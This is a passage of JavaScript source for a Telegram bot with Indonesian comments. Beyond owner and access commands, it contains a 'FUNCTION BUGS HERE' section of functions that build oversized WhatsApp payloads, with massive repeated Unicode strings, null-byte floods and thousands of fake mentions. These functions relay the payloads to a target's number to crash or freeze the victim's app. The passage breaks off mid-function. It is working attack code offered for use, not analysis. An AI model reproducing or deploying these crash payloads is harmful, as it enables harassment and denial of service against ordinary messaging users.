  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});*/

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.command("getcode", async (ctx) => {
    const chatId = ctx.chat.id;
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = input;

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            // simpan ke file sementara
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

            fs.unlinkSync(filePath); // hapus file setelah dikirim
        } else {
            await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        ctx.reply("❌ Error fetching website source code. Please try again later.");
    }
});

console.clear();
console.log(chalk.bold.white(`\n
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠄⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡈⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠄⠀⠀⠀⠀⠈⠙⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⡶⠦⣠⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠈⣟⠲⡎⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡰⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠄⢂⠀⠀⠀⠀⠀⣀⣠⠠⢖⣋⡥⢖⣩⠔⠊⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣨⠭⢵⣒⣩⠬⢖⠏⠁⢀⣀⠀⠀⠀
⠀⠀⠈⠓⠒⠦⠍⠭⠭⣭⠭⠭⠭⠭⡿⡓⠒⠛⠉⠉⠀⠀⣠⠇⠀⠀⠘⠞⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠁⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠉⠉⠙⠒⠒⠚⠉⠁⠀⠀⠀⠁⢣⡎⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

   ___  _     __  _          _____            
  / _ \\(_)___/ /_(_)  _____ / ___/__  _______ 
 / // / / __/ __/ / |/ / -_) /__/ _ \\/ __/ -_)
/____/_/\\__/\\__/_/|___/\\__/\\___/\\___/_/  \\__/ 
`))

console.log(chalk.cyanBright(`
─────────────────────────────────────
NAME APPS   : VZENTRA 
AUTHOR      : GHANZ/RADIT
ID OWN      : ${ownerIds}
VERSION     : V3
─────────────────────────────────────\n\n`));

bot.launch();

// Si anjing sialan ini yang bikin gw pusing 
setTimeout(() => {
  console.log('🔄 Starting auto-reload activated');
  forceReloadWithRetry();
}, 15000);

// nambahin periodic health check biar aman aja
setInterval(() => {
  const activeSessions = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
  
  console.log(`📊 Health Check: ${activeSessions}/${totalRegisteredSessions} sessions active`);
  
  // Only attempt reload if we have registered sessions but none are active
  if (totalRegisteredSessions > 0 && activeSessions === 0) {
    console.log('🔄 Health check: Found registered sessions but none active, attempting reload...');
    reloadAttempts = 0; // Reset counter
    forceReloadWithRetry();
  } else if (activeSessions > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000); // Check setiap 10 menit

// ================ FUNCTION BUGS HERE ================== \\
/*
  Function nya isi Ama function punya lu sendiri
*/
// FUNCTION BLANK
async function afd(X) {
    const aa = "ꦾ".repeat(20000);
    
    // PESAN 1: viewOnceMessage dengan location
    let bokep = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true,
                        locationMessage: {
                            degreesLatitude: 999999999,
                            degreesLongitude: -99999999,
                            name: aa,
                            address: aa,
                        }
                    },
                    body: {
                        text: aa,
                    },
                    footer: {
                        text: aa,
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_call",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                })
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "ꦽ".repeat(5000)
                            }
                        ],
                        messageParamsJson: "{}".repeat(10000)
                    }
                }
            }
        }
    };
    
    let buttons = [
        {
            name: "single_select",
            buttonParamsJson: "",
        },
    ];

    for (let i = 0; i < 100; i++) {
        buttons.push(
            {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                    display_text: "ꦽ".repeat(5000),
                }),
            },
            {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                    display_text: "ꦽ".repeat(5000),
                }),
            },
            {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                    display_text: "ꦽ".repeat(5000),
                }),
            }
        );
    }

    let msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: aa,
                        hasMediaAttachment: false,
                    },
                    body: {
                        text: aa,
                    },
                    footer: {
                        text: aa,
                    },
                    nativeFlowMessage: {
                        buttons: buttons
                    },
                    contextInfo: {
                        forwardingScore: 2147483647,
                        isForwarded: true,
                        isSampled: true,
                        expireAt: 253402300799000,
                        participant: target,
                        remoteJid: "status@broadcast",
                        stanzaId: "ꦾ".repeat(10000),
                        deviceListMetadata: {
                            senderKeyHash: "ꦾ".repeat(7000),
                            senderTimestamp: "9999999999999",
                            recipientKeyHash: "ꦾ".repeat(6000),
                            recipientTimestamp: "8888888888888",
                            userIdentity: "ꦾ".repeat(4000)
                        },
                        botInvocationMetadata: {
                            botId: "exploit_bot@",
                            invocationType: "BOT_INVOCATION_TYPE_QUERY",
                            invocationSource: "BOT_INVOCATION_SOURCE_QUICK_REPLY",
                            botMessageSecret: "ꦾ".repeat(4000)
                        },
                        newsletterAdminInviteMessage: {
                            newsletterJid: "123456789@newsletter",
                            newsletterName: "ꦾ".repeat(9000),
                            caption: "ꦾ".repeat(10000),
                            inviteExpiration: 253402300799000,
                            newsletterThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7yNpExH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q=="
                        },
                        quotedMessage: {
                            extendedTextMessage: {
                                text: "J".repeat(10000),
                                contextInfo: {
                                    forwardingScore: 999999,
                                    isForwarded: true,
                                    stanzaId: "ꦾ".repeat(10000),
                                    participant: "0@s.whatsapp.net",
                                    remoteJid: "status@broadcast",
                                    deviceListMetadata: {
                                        senderKeyHash: "ꦾ".repeat(10000),
                                        recipientKeyHash: "ꦾ".repeat(10000)
                                    }
                                }
                            }
                        },
                        conversionSource: "ꦾ".repeat(20000),
                        conversionData: Buffer.from("ꦾ".repeat(1000)),
                        conversionDelaySeconds: 2147483647,
                        externalAdReply: {
                            title: "ꦾ".repeat(20000),
                            body: "ꦾ".repeat(20000),
                            mediaType: "IMAGE",
                            thumbnailUrl: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ/0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7yNpExH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
                            mediaUrl: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
                            sourceUrl: "t.me/OndetMpx",
                        }
                    }
                }
            }
        }
    };

    try {
        await sock.relayMessage(target, bokep, {
            messageId: null,
            participant: { jid: target }
        });
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        await sock.relayMessage(target, msg, {
            messageId: null,
            participant: { jid: target }
        });

        console.log("✅ Kedua pesan berhasil dikirim");
    } catch (error) {
        console.log("❌ Error:", error.message);
    }
}
async function ZenoKillNotif(X) {
  const msg = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ោ៝".repeat(20000),
            hasMediaAttachment: false,
          },
          contextInfo: {
            participant: X,
            mentionedJid: [
              "13133822@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: X,
            stanzaId: "1234567890ABCDEF" ,
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
            },
          },
          body: {
            text: "𝗫 - 𝗭 𝗘 𝗡 𝗢" + "\n".repeat(9000),
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "\n",
                  flow_message_version: "3"
                })
              },
              {
                name: "order_status",
                buttonParamsJson: JSON.stringify({
                  status: true
                })
              },
              {
                name: "mpm",
                buttonParamsJson: JSON.stringify({
                  status: true
                })
              },
            ],
          },
        },
      },
    },
  };
  
  await sock.relayMessage(target, msg, {
    messageId: "",
    participant: { jid: target },
  });
}
async function N3xithBlank(sock, X) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "꙳͙͡༑ᐧ𝐒̬𝖎፝͢𝑿 ⍣᳟ 𝐍ͮ𝟑͜𝐮̽𝐕𝐞𝐫̬⃜꙳𝐗ͮ𝐨͢͡𝐗༑〽️" + "ោ៝".repeat(10000),
      caption: "𝐍𝟑𝐱̈𝒊𝐭𝐡 Cʟᴀsˢˢˢ #🇧🇳 ( 𝟑𝟑𝟑 )" + "꧀".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  try {
    await sock.relayMessage(X, msg, {
      participant: { jid: X },
      messageId: sock.generateMessageTag?.() || generateMessageID()
    });
  } catch (error) {
    console.error(`❌ Gagal mengirim bug ke ${X}:`, error.message);
  }
}

async function protocolbug19(sock, target) {
   let HtsAnjir = await prepareWAMessageMedia({
      video: {
         url: "https://mmg.whatsapp.net/v/t62.7161-24/543874146_701733799656425_1962288507009302343_n.enc?ccb=11-4&oh=01_Q5Aa3AFiej4nbt_M9XxYBDpplVdFUucRd510mCaU-IGU5nR_-Q&oe=6947C949&_nc_sid=5e03e0"
      },
      mimetype: "video/mp4",
      fileSha256: "sI35p92ZSwo+OMIPRJt2UlKUFmwgwizYOheNU7LtO5k=",
      fileEncSha256: "/6FWCFe34cg/QH4RpN3AOLTOS8wLJ9JI6zQoyJZgg5Y=",
      fileLength: 3133846,
      seconds: 26
   }, {
      upload: sock.waUploadToServer
   });
   const BututAhAh = {
      buttons: [
         {
            name: "galaxy_message",
            buttonParamsJson: `{\"flow_cta\":\"${"\u0000".repeat(200000)}\"}`,
            version: 3
         }
      ]
   };
   const PouCrousel = () => ({
      header: {
         ...HtsAnjir,
         hasMediaAttachment: true
      },
      nativeFlowMessage: {
            ...BututAhAh,
      }
   });
   let PouMsg = await generateWAMessageFromContent(target,
      proto.Message.fromObject({
         groupMentionedMessage: {
            message: {
               interactiveMessage: {
                  body: { text: "INDICTIVE_CORE V3" },
                  carouselMessage: {
                     cards: [
                        PouCrousel(),
                        PouCrousel(),
                        PouCrousel(),
                        PouCrousel(),
                        PouCrousel()
                     ]
                  },
                  contextInfo: { mentionedJid: [target] }
               }
            }
         }
      }),
      { userJid: target, quoted: null }
   );
   await sock.relayMessage(target, PouMsg.message, {
      participant: { jid: target }
   });
}

// FUNCTION DELAY
async function bugger(sock, target) {
  const aa = "𑜦𑜠".repeat(20000);
  
  let msg = {
    ephemeralMessage: {
      message: {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/octet-stream",
                  fileSha256: "QxkYuxM0qMDgqUK5WCi91bKWGFDoHhNNkrRlfMNEjTo=",
                  fileLength: "99999999999",
                  pageCount: 999999999,
                  mediaKey: "prx9yPJPZEJ5aVgJnrpnHYCe8UzNZX6/QFESh0FTq+w=",
                  fileEncSha256: "zJgg0nMJT1uBohdzwDXkOxaRlQnhJZb+qzLF1lbLucc=",
                  directPath: "/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1762488513",
                  fileName: aa,
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAtAAACAwEAAAAAAAAAAAAAAAAABAIDBQEBAQEBAAAAAAAAAAAAAAAAAAABEv/aAAwDAQACEAMQAAAAQgzOsuOtNHI6YZhpxRWpeubdXLKhm1ckeEqlp6CS4B//xAAkEAACAwABAwQDAQAAAAAAAAABAgADEQQSFEETMXFREDJCUv/aAAgBAQABPwDtVC4riLw6zvU8bitpzI1Tge0FQW1ARgjUKOSVzwZZxwjosoqSpQp8ndyXUNYQ31DxrS4eNxrGsDmcjju7KyjzD+G8TcG7H5PSPE7m2dwzIwM63/1P3c/QlrqkqAdfqehn9CLfWPacy0m3QYrM1S4fM67x8iBg3zkZAf6muAMMc2fJgvOZk9YzuW9sh5BzMn//xAAXEQEBAQEAAAAAAAAAAAAAAAARAAEg/9oACAECAQE/ACJmLNOf/8QAGREBAQADAQAAAAAAAAAAAAAAAREAAhBC/9oACAEDAQE/ADaNg5cdVJZhqnpeJeV7/9k="
                }
              },
              body: {
                text: aa
              },
              footer: {
                text: aa
              },
              contextInfo: {
                mentionedJid: Array.from({ length: 1999 }, () => 
                  "1" + Math.floor(Math.random() * 5000000) + "917267@s.whatsapp.net"
                ),
                isForwarded: true,
                forwardingScore: 999,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "696969696969@newsletter",
                  serverMessageId: 1,
                  newsletterName: "pinjem ven"
                }
              }
            }
          }
        }
      }
    }
  };

  const tai = generateWAMessageFromContent(target, msg, {});

  await sock.relayMessage("status@broadcast", tai.message, {
    messageId: tai.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });

  let bokep = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
              fileLength: "999999999999",
              pageCount: 1316134911,
              mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
              fileName: "Rexcc" + "ꦾ".repeat(60000),
              fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
              directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1743848703",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
              streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
              thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
              thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
              thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
              artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
              artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
              artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
              artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=", 
            }
          },
          body: {
            text: aa
          },
          footer: {
            text: aa
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: aa,
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "\u0000".repeat(60000),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  const ti = generateWAMessageFromContent(target, bokep, {});

  await sock.relayMessage("status@broadcast", ti.message, {
    messageId: ti.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
}
async function OdzDelayPriv(sock, target, mention) {
    try {
        const msg1 = {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo="),
                        fileLength: "9999999999999",
                        pageCount: 1316134911,
                        mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec="),
                        fileName: "Ondet Nih Woi" + "𑜦𑜠".repeat(25000),
                        fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo="),
                        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1726867151",
                        contactVcard: false,
                        jpegThumbnail: null,
                    }
                },
                body: { text: "ꦾ".repeat(10000) },
                contextInfo: {
                    stanzaId: "metawai_id",
                    forwardingScore: 999,
                    participant: target,
                    mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                }
            }
        };

        const msg2 = {
            viewOnceMessage: {
                message: {
                    locationMessage: {
                        degreesLatitude: -9.99999999,
                        degreesLongitude: -9.9999999,
                        name: "ꦽ".repeat(30500),
                        address: "ꦽ".repeat(30000),
                        contextInfo: {
